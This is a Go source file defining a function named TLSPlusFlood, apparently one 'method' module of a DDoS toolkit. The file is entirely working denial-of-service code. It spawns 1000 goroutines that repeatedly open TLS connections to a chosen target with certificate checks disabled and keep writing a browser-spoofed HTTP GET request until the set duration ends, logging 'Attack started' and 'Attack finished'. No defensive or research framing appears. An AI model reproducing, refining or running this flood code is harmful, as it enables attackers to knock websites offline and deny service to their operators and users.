package methods

import (
	"crypto/tls"
	"fmt"
	"net/url"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"time"
)

func TLSPlusFlood(target string, sec int) {
	u, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Failed to parse URL: %v\n", err)
		return
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":443"
	}

	fmt.Printf("[%s] TLS+ (Direct Raw) Attack started on %s for %ds\n",
		time.Now().Format("15:04:05"), target, sec)

	header := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
		u.Path, u.Host)

	stopTime := time.Now().Add(time.Duration(sec) * time.Second)

	var wg sync.WaitGroup
	for i := 0; i < 1000; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			payloadBytes := []byte(header)

			for time.Now().Before(stopTime) {
				conn, err := tls.Dial("tcp", host, &tls.Config{
					InsecureSkipVerify: true,
					ServerName:         u.Host,
				})
				if err != nil {
					time.Sleep(1000 * time.Millisecond)
					continue
				}

				for time.Now().Before(stopTime) {
					conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
					_, err := conn.Write(payloadBytes)
					if err != nil {
						break
					}
				}
				conn.Close()
			}
		}()
	}

	wg.Wait()

	runtime.GC()
	debug.FreeOSMemory()
	fmt.Printf("[%s] TLS+ (Direct) Attack finished. RAM Freed.\n", time.Now().Format("15:04:05"))
}
